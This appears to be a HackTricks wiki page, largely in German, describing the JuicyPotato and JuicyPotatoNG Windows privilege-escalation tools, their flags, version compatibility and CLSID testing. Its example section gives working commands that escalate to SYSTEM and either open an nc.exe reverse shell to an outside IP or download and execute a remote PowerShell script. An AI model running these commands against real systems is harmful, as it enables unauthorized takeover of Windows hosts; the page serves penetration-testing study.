# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato ist veraltet. Es funktioniert im Allgemeinen auf Windows-Versionen bis einschließlich Windows 10 1803 / Windows Server 2016. Microsoft-Änderungen, die ab Windows 10 1809 / Server 2019 eingeführt wurden, haben die ursprüngliche Technik gebrochen. Für diese Builds und neuer sollten Sie moderne Alternativen wie PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato und andere in Betracht ziehen. Siehe die untenstehende Seite für aktuelle Optionen und Verwendung.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (Ausnutzung der goldenen Privilegien) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Eine aufgepeppte Version von_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, mit etwas Juice, d.h. **ein weiteres Local Privilege Escalation tool, von Windows Service Accounts zu NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Kompatibilitäts-Kurzhinweise

- Funktioniert zuverlässig bis Windows 10 1803 und Windows Server 2016, wenn der aktuelle Kontext über SeImpersonatePrivilege oder SeAssignPrimaryTokenPrivilege verfügt.
- Durch Microsoft-Härtung in Windows 10 1809 / Windows Server 2019 und neuer gebrochen. Für diese Builds bevorzugen Sie die oben verlinkten Alternativen.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) und seine [variants](https://github.com/decoder-it/lonelypotato) nutzen die privilege escalation chain basierend auf dem `BITS` [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), der den MiTM-Listener auf `127.0.0.1:6666` hat, und wenn man `SeImpersonate` oder `SeAssignPrimaryToken` Privilegien besitzt. Während einer Windows-Build-Überprüfung fanden wir eine Konfiguration, in der `BITS` absichtlich deaktiviert war und Port `6666` belegt war.

Wir entschieden uns, RottenPotatoNG zu weaponisieren: Say hello to Juicy Potato.

> Für die Theorie siehe [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) und folge der Kette von Links und Referenzen.

Wir entdeckten, dass es neben `BITS` mehrere COM-Server gibt, die wir missbrauchen können. Sie müssen lediglich:

1. vom aktuellen Benutzer instanziierbar sein, normalerweise ein “service user”, der Impersonation-Privilegien hat
2. die `IMarshal`-Schnittstelle implementieren
3. als erhöhter Benutzer (SYSTEM, Administrator, …) laufen

Nach einigen Tests erhielten und prüften wir eine umfangreiche Liste interessanter CLSIDs auf mehreren Windows-Versionen.

### Saftige Details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato erlaubt es dir:

- **Target CLSID** _pick any CLSID you want._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _you can find the list organized by OS._
- **COM Listening port** _define COM listening port you prefer (instead of the marshalled hardcoded 6666)_
- **COM Listening IP address** _bind the server on any IP_
- **Process creation mode** _abhängig von den Privilegien des impersonierten Benutzers kannst du wählen zwischen:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _Starte ein ausführbares Programm oder Script, falls die Ausnutzung erfolgreich ist_
- **Process Argument** _Passe die Argumente des gestarteten Prozesses an_
- **RPC Server address** _Für einen stealthy Ansatz kannst du dich an einem externen RPC-Server authentifizieren_
- **RPC Server port** _nützlich, falls du dich an einem externen Server authentifizieren möchtest und eine Firewall Port `135` blockiert…_
- **TEST mode** _hauptsächlich zu Testzwecken, z.B. zum Testen von CLSIDs. Es erstellt das DCOM und gibt den Benutzer des Tokens aus. Siehe_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Wenn der Benutzer die Berechtigungen `SeImpersonate` oder `SeAssignPrimaryToken` hat, dann sind Sie **SYSTEM**.

Es ist nahezu unmöglich, den Missbrauch all dieser COM-Server zu verhindern. Man könnte darüber nachdenken, die Berechtigungen dieser Objekte via `DCOMCNFG` zu ändern, aber viel Glück — das wird herausfordernd.

Die eigentliche Lösung ist, sensible Accounts und Anwendungen zu schützen, die unter den `* SERVICE`-Konten laufen. Das Abschalten von `DCOM` würde diesen Exploit zwar behindern, könnte aber ernsthafte Auswirkungen auf das zugrunde liegende Betriebssystem haben.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG re-introduces a JuicyPotato-style local privilege escalation on modern Windows by combining:
- DCOM OXID-Auflösung zu einem lokalen RPC-Server auf einem gewählten Port, wodurch der alte hardcoded 127.0.0.1:6666 Listener vermieden wird.
- Ein SSPI-Hook, um die eingehende SYSTEM-Authentifizierung abzufangen und zu impersonate, ohne RpcImpersonateClient zu benötigen, was außerdem CreateProcessAsUser ermöglicht, wenn nur SeAssignPrimaryTokenPrivilege vorhanden ist.
- Tricks, um DCOM-Aktivierungsbeschränkungen zu erfüllen (z. B. die frühere INTERACTIVE-Gruppen-Anforderung beim Anvisieren der Klassen PrintNotify / ActiveX Installer Service).

Wichtige Hinweise (Verhalten verändert sich über verschiedene Builds):
- September 2022: Die anfängliche Technik funktionierte auf unterstützten Windows 10/11- und Server-Zielen unter Verwendung des “INTERACTIVE trick”.
- Januar 2023 Update der Autoren: Microsoft blockierte später den INTERACTIVE trick. Ein anderer CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) stellt die Ausnutzung wieder her, aber laut ihrem Beitrag nur auf Windows 11 / Server 2022.

Grundlegende Verwendung (mehr Flags in der Hilfe):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Wenn du Windows 10 1809 / Server 2019 anvisierst, wo klassisches JuicyPotato gepatcht ist, verwende vorzugsweise die oben verlinkten Alternativen (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG kann je nach Build und Dienstzustand situationsabhängig sein.

## Beispiele

Hinweis: Besuche [diese Seite](https://ohpe.it/juicy-potato/CLSID/) für eine Liste von CLSIDs zum Ausprobieren.

### nc.exe reverse shell erhalten
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Ein neues CMD starten (wenn du RDP-Zugang hast)

![](<../../images/image (300).png>)

## CLSID-Probleme

Oftmals funktioniert die Standard-CLSID, die JuicyPotato verwendet, **nicht** und der exploit schlägt fehl. Normalerweise sind mehrere Versuche nötig, um eine **funktionierende CLSID** zu finden. Um eine Liste von CLSIDs zu erhalten, die für ein bestimmtes Betriebssystem ausprobiert werden können, solltest du diese Seite besuchen:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID prüfen**

Zuerst benötigst du einige ausführbare Dateien neben juicypotato.exe.

Lade Join-Object.ps1 herunter und lade es in deine PS-Sitzung, und lade und führe GetCLSID.ps1 aus. Dieses Skript erstellt eine Liste möglicher CLSIDs zum Testen.

Lade dann test_clsid.bat herunter (ändere den Pfad zur CLSID-Liste und zur juicypotato-Executable) und führe sie aus. Sie wird jede CLSID ausprobieren, und **wenn sich die Portnummer ändert, bedeutet das, dass die CLSID funktioniert hat**.

**Überprüfe** die funktionierenden CLSIDs **mit dem Parameter -c**

## Quellen

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
